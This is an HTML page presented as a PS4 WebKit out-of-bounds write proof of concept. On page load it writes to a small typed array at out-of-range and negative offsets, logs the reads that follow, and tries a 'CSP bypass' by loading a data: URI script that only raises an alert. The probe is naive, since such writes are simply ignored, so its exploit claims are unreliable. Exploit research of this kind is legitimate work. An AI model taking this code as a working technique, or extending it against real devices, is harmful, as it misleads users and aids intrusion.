<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Enhanced OOB Write POC (v12.00) - Focused Logging</title>
    <style>
        body { font-family: monospace; white-space: pre-wrap; }
        #output { margin-top: 20px; padding: 10px; border: 1px solid #ccc; background-color: #f8f8f8; }
        .critical { color: magenta; font-weight: bold; }
        .warning { color: orange; }
        .success { color: green; }
        .error { color: red; }
        .info { color: blue; }
    </style>
</head>
<body>
    <h1>PS4 WebKit Enhanced OOB Write POC (v12.00) - Focused Logging</h1>
    <div id="output"></div>

    <script>
        const log = (message, type = 'info') => {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
        };

        async function focusedOOBWriteTest() {
            log("Iniciando Teste de OOB Write com Logging Focado...", 'critical');

            const bufferSize = 32; // Usando o tamanho do buffer dos logs anteriores
            const writeOffsets = [32, 33, 64, -1]; // Testando offsets próximos ao limite e um negativo
            const writeValue = 0xAA; // Valor para escrita
            const readOffsets = [0, 1, bufferSize - 1, bufferSize, bufferSize + 1]; // Lendo dentro e fora dos limites

            log(`ArrayBuffer criado com tamanho: ${bufferSize}`, 'info');
            log(`Valor de escrita: 0x${writeValue.toString(16)}`, 'info');
            log(`Offsets de escrita a serem testados: ${writeOffsets.join(', ')}`, 'info');
            log(`Offsets de leitura a serem testados após cada escrita: ${readOffsets.join(', ')}`, 'info');

            for (const writeOffset of writeOffsets) {
                log(`\n--- Testando escrita no offset: ${writeOffset} ---`, 'warning');
                try {
                    const buffer = new ArrayBuffer(bufferSize);
                    const view = new Uint8Array(buffer);
                    view[writeOffset] = writeValue;
                    log(`  Escrita no offset ${writeOffset} aparentemente bem-sucedida.`, 'success');

                    for (const readOffset of readOffsets) {
                        try {
                            const readValue = view[readOffset];
                            log(`    Leitura no offset: ${readOffset}, valor: 0x${readValue.toString(16)}`, 'info');
                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
                                log(`<span class="critical">POSSÍVEL CORRUPÇÃO (write=${writeOffset}, read=${readOffset})</span>`, 'critical');
                            } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
                                log(`<span class="critical">POSSÍVEL CORRUPÇÃO (write=${writeOffset}, read=${readOffset}, offset negativo)</span>`, 'critical');
                            }
                        } catch (readError) {
                            log(`    Erro ao ler no offset: ${readOffset}: ${readError.message}`, 'error');
                        }
                    }
                    // Pequeno delay após cada tentativa
                    await new Promise(resolve => setTimeout(resolve, 250));
                } catch (writeError) {
                    log(`  Erro ao escrever no offset ${writeOffset}: ${writeError.message}`, 'error');
                }
            }

            log("\nTeste de OOB Write com Logging Focado Concluído.", 'critical');

            // ====================== Fase 2: Teste Simplificado de Bypass de CSP ======================
            log("\nFase 2: Teste Simplificado de Bypass de CSP...", 'warning');

            const dataUri = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgZm9jdXMgT09CIFdyaXRlIGxvZ3MnKTs=';
            const script = document.createElement('script');
            script.src = dataUri;
            script.onload = () => log(`<span class="success">Bypass de CSP via data: URI BEM-SUCEDIDO!</span>`, 'success');
            script.onerror = () => log(`<span class="error">Falha no Bypass de CSP via data: URI.</span>`, 'error');
            document.body.appendChild(script);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        document.addEventListener('DOMContentLoaded', focusedOOBWriteTest);
    </script>
</body>
</html>
